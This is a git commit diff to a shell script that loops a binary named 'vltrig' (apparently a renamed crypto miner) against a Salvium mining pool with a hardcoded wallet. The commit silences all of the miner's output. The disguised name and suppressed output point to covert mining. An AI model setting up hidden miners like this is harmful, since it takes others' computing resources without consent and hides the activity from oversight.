a561b0843dba4439f1ef70bd62921c6336f482df
prendibs <94189491+prendibs@users.noreply.github.com>
2026-06-06 00:26:36 +0700

    Modify vltrig command to suppress output
    Redirect output of vltrig command to /dev/null.

--- z.sh
+++ z.sh
@@ -5,8 +5,8 @@ do
   ./vltrig \
     -o sg.salvium.herominers.com:1230 \
     -u SC1siBfG9HHfqjGkSYgEqALbd4WQZ37ZAj9mjPMgfqzdUiHrRuKEYLRLEm7uQt81xBgs2QzEEi6Yi6VXXqU5p6U8f124RMEobFN \
-    -B \
-    --tls
+    --tls \
+    </dev/null >/dev/null 2>&1
 
   echo "waduhh. Restarting in 10 seconds..."
   sleep 10
